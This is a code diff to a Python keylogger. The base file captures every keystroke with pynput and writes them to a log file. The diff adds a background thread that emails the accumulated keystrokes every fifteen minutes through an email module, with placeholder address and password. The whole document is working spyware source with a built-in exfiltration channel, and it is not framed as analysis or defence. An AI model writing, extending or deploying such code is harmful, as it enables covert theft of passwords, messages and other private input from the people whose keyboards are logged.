@@ -1,4 +1,7 @@
 from pynput.keyboard import Listener
+from threading import Thread
+import email_send
+from time import sleep
 
 #string which will contain all the pressed keys ( to be send by email )
 input_string = ''
@@ -33,8 +36,21 @@ def log_keystroke(key):
     with open("log.txt", 'a',encoding='utf-8') as f:
         f.write(pressed)
 
-
+def report():
+    while True:
+        global input_string
+        email_send.sendmail("email", "pwd", input_string)
+        input_string = ""
+        #sleep for 15 min
+        sleep(900)
+   
 
 def start_listener():
     with Listener(on_press=log_keystroke) as l:
         l.join()
+
+def start_timer():
+    #start the thread that sends email every x seconds
+    thread = Thread(target = report)
+    thread.start()
+    
